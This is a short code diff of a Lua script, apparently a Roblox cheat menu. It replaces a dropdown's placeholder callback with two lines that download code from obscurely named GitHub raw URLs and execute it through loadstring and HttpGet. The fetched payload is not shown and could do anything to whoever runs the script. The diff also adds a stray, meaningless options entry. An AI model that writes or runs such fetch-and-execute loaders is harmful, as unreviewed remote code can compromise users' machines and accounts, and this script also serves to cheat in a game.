@@ -76,20 +76,11 @@ local MainSection = MainTab:CreateSection("Main")
    local Dropdown = MainTab:CreateDropdown({
    Name = "Fists",
    Options = {"Fist100Td", "Fist1000Td"},
-   CurrentOption = {"Option 1"},
+   CurrentOption = {"Option 1"},{"Option 2"},
    MultipleOptions = false,
    Flag = "Dropdown1",
    Callback = function(Options)
-       -- Seçilen seçeneği al
-       local selectedOption = Options[1] 
-
-       -- Seçeneğe göre işlem yap
-       if selectedOption == "Fist100Td" then
-           print("Fist100Td seçildi! Buraya özel kod ekleyebilirsin.")
-           -- Buraya Fist100Td'ye özel kodunu yaz
-       elseif selectedOption == "Fist1000Td" then
-           print("Fist1000Td seçildi! Buraya özel kod ekleyebilirsin.")
-           -- Buraya Fist1000Td'ye özel kodunu yaz
-       end
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/massthix/fdgbwerh/refs/heads/main/asdasdasd", true))()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/massthix/massthix/refs/heads/main/massthix", true))()
    end,
 })
